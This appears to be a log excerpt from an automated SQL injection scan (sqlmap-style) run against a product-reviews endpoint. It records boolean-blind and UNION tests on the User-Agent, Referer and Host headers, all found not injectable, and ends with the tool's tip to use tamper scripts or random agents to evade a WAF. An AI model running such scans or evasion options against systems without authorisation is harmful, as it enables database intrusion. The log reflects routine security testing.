INFO - [20:29:11] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:29:11] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:29:12] [INFO] testing 'Generic inline queries'
INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
INFO - [20:29:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:29:12] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:29:13] [WARNING] parameter 'User-Agent' does not seem to be injectable
INFO - [20:29:13] [INFO] testing if parameter 'Referer' is dynamic
INFO - [20:29:13] [WARNING] parameter 'Referer' does not appear to be dynamic
INFO - [20:29:13] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
INFO - [20:29:13] [INFO] testing for SQL injection on parameter 'Referer'
INFO - [20:29:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:29:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:29:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:29:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:29:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:29:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:29:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:29:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:29:15] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:29:15] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:29:15] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:29:15] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:29:15] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:29:15] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:29:16] [INFO] testing 'Generic inline queries'
INFO - [20:29:16] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:29:16] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:29:17] [WARNING] parameter 'Referer' does not seem to be injectable
INFO - [20:29:17] [INFO] testing if parameter 'Host' is dynamic
INFO - [20:29:17] [WARNING] parameter 'Host' does not appear to be dynamic
INFO - [20:29:17] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
INFO - [20:29:17] [INFO] testing for SQL injection on parameter 'Host'
INFO - [20:29:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:29:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:29:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:29:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:29:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:29:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:29:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:29:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:29:19] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:29:19] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:29:19] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:29:19] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:29:19] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:29:19] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:29:20] [INFO] testing 'Generic inline queries'
INFO - [20:29:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:29:20] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:29:21] [WARNING] parameter 'Host' does not seem to be injectable
INFO - [20:29:21] [CRITICAL] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
INFO - [20:29:21] [WARNING] HTTP error codes detected during run:
INFO - 500 (Internal Server Error) - 3455 times, 404 (Not Found) - 4 times
INFO - [*] ending @ 20:29:21 /2025-09-26/
WARNING - Could not parse DB names, but sqlmap output saved to attack-logs-dynamic\Get_reviews_for_a_product_dbs.log
